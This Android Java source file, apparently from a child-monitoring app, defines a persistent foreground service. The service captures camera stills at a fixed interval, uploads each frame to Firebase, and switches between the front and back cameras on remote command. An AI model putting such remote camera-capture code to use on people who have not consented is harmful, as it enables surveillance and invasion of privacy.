package com.monitor.child.service;

import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Log;
import android.util.Size;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;

import com.monitor.child.ChildApp;
import com.monitor.child.MainActivity;
import com.monitor.child.R;
import com.monitor.child.manager.FirebaseManager;
import com.monitor.child.utils.Constants;

import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class CameraCaptureService extends Service {
    private static final String TAG = "CameraCaptureService";

    private CameraManager cameraManager;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private ScheduledExecutorService scheduler;
    private String cameraId;
    private boolean isRunning = false;
    private String currentCamera = Constants.CAMERA_FRONT;

    @Override
    public void onCreate() {
        super.onCreate();
        cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
        scheduler = Executors.newSingleThreadScheduledExecutor();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(Constants.NOTIFICATION_ID_CAMERA, createNotification());

        FirebaseManager.getInstance().setOnCommandListener(command -> {
            if (Constants.COMMAND_SWITCH_CAMERA.equals(command)) {
                switchCamera();
            }
        });

        startCapture();
        return START_STICKY;
    }

    private void startCapture() {
        if (isRunning) return;
        isRunning = true;
        openCamera();
    }

    private void openCamera() {
        try {
            cameraId = getCameraId(currentCamera);
            if (cameraId == null) {
                Log.e(TAG, "No camera found for: " + currentCamera);
                return;
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                cameraManager.openCamera(cameraId, cameraStateCallback, backgroundHandler);
            } else {
                cameraManager.openCamera(cameraId, cameraStateCallback, backgroundHandler);
            }
        } catch (CameraAccessException | SecurityException e) {
            Log.e(TAG, "Error opening camera: " + e.getMessage());
        }
    }

    private final CameraDevice.StateCallback cameraStateCallback = new CameraDevice.StateCallback() {
        @Override
        public void onOpened(@NonNull CameraDevice device) {
            cameraDevice = device;
            createCaptureSession();
        }

        @Override
        public void onDisconnected(@NonNull CameraDevice device) {
            device.close();
            cameraDevice = null;
        }

        @Override
        public void onError(@NonNull CameraDevice device, int error) {
            device.close();
            cameraDevice = null;
            Log.e(TAG, "Camera error: " + error);
        }
    };

    private void createCaptureSession() {
        try {
            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
            StreamConfigurationMap configMap = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            Size[] sizes = configMap.getOutputSizes(ImageFormat.JPEG);
            Size captureSize = sizes[0];

            imageReader = ImageReader.newInstance(captureSize.getWidth(), captureSize.getHeight(),
                    ImageFormat.JPEG, 2);
            imageReader.setOnImageAvailableListener(imageReaderListener, backgroundHandler);

            cameraDevice.createCaptureSession(
                    Arrays.asList(imageReader.getSurface()),
                    captureSessionCallback,
                    backgroundHandler
            );
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error creating session: " + e.getMessage());
        }
    }

    private final CameraCaptureSession.StateCallback captureSessionCallback = new CameraCaptureSession.StateCallback() {
        @Override
        public void onConfigured(@NonNull CameraCaptureSession session) {
            captureSession = session;
            startRepeatingCapture();
        }

        @Override
        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
            Log.e(TAG, "Capture session config failed");
        }
    };

    private void startRepeatingCapture() {
        try {
            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
            builder.addTarget(imageReader.getSurface());
            builder.set(CaptureRequest.JPEG_QUALITY, (byte) 50);
            builder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);

            captureSession.setRepeatingRequest(builder.build(), null, backgroundHandler);

            scheduler.scheduleAtFixedRate(this::captureStill, 0,
                    Constants.CAMERA_CAPTURE_INTERVAL_MS, TimeUnit.MILLISECONDS);

        } catch (CameraAccessException e) {
            Log.e(TAG, "Error starting capture: " + e.getMessage());
        }
    }

    private void captureStill() {
        if (cameraDevice == null || captureSession == null) return;
        try {
            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            builder.addTarget(imageReader.getSurface());
            builder.set(CaptureRequest.JPEG_QUALITY, (byte) 50);
            builder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);

            captureSession.capture(builder.build(), null, backgroundHandler);
        } catch (CameraAccessException e) {
            Log.e(TAG, "Still capture error: " + e.getMessage());
        }
    }

    private final ImageReader.OnImageAvailableListener imageReaderListener = reader -> {
        Image image = reader.acquireLatestImage();
        if (image != null) {
            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
            byte[] bytes = new byte[buffer.remaining()];
            buffer.get(bytes);
            image.close();

            FirebaseManager.getInstance().uploadCameraFrame(bytes);
        }
    };

    private void switchCamera() {
        closeCamera();
        currentCamera = currentCamera.equals(Constants.CAMERA_FRONT) ?
                Constants.CAMERA_BACK : Constants.CAMERA_FRONT;
        openCamera();
    }

    private String getCameraId(String direction) {
        try {
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                if (direction.equals(Constants.CAMERA_FRONT) &&
                        facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    return id;
                }
                if (direction.equals(Constants.CAMERA_BACK) &&
                        facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    return id;
                }
            }
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error getting camera ID: " + e.getMessage());
        }
        return null;
    }

    private void closeCamera() {
        if (captureSession != null) {
            captureSession.close();
            captureSession = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
    }

    private android.app.Notification createNotification() {
        Intent notifyIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, notifyIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

        return new NotificationCompat.Builder(this, ChildApp.CHANNEL_CAMERA)
                .setContentTitle("Camera Monitor")
                .setContentText("Capturing camera feed...")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        closeCamera();
        if (scheduler != null) {
            scheduler.shutdown();
        }
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
